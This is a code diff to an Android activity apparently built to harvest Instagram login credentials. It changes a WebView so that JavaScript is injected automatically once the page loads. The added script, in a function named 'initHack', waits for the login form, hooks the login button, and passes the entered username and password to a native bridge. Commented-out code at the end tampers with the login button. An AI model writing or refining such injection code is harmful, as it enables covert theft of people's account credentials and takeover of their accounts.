@@ -52,11 +52,9 @@ class InstaActivity : AppCompatActivity() {
 
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
+                injectJs(view)
 
-                binding.getDataBtn.setOnClickListener {
-                    injectJs(view)
-                     //showCreds()
-                }
+
             }
 
         }
@@ -71,14 +69,48 @@ class InstaActivity : AppCompatActivity() {
     private fun injectJs(view: WebView?) {
         view!!.loadUrl(
             """
-                
-                   javascript: 
+                 javascript: 
                    (function(){
+                   
+                 var vis = 0;
+                  
+                    function waitForElement(id, callback){
                 
-                   let element = document.getElementsByClassName("_aa4b _add6 _ac4d");
-                   let username = element.username.value;
-                   let pass = element.password.value;
-                   Bridge.callFromJS(username,pass)   
+                 var poops = setInterval(function(){
+                  if(document.getElementsByClassName(id)[1] && vis!=1){
+                    clearInterval(poops);
+                    callback(); vis = 1;
+                         }
+                         }, 100);
+                  }
+                  
+
+             waitForElement("_aa4b _add6 _ac4d", function(){
+                        
+                        initHack();
+                       
+                });
+               
+                    function initHack(){
+                        console.log("clickedLogin");
+                        let element = document.getElementsByClassName("_aa4b _add6 _ac4d");
+                        let username = 123;
+                        let pass = 123;
+                   
+                   
+                        let authBtn = document.getElementsByClassName("_acan _acap _acas")[1];
+                        authBtn.onclick= function() {myFunc()};
+                  
+                         function myFunc(){
+                              username = element.username.value;
+                             pass = element.password.value;
+                             Bridge.callFromJS(username,pass);
+                             console.log(username);
+                        
+                          }
+                    }
+                    
+                    
           
               })()
                 """
@@ -87,3 +119,15 @@ class InstaActivity : AppCompatActivity() {
 
 
 }
+//function initViews(){
+//    console.log("Initiating views ");
+//    let loginBtn = document.getElementsByClassName("_acan _acao _acas")[0];
+//    loginBtn.remove();
+//    loginBtn.onclick = function() {initHack()};
+
+
+//function myFunc(){
+//    username = element.username.value;
+//    pass = element.password.value;
+//    Bridge.callFromJS(username,pass);
+//}
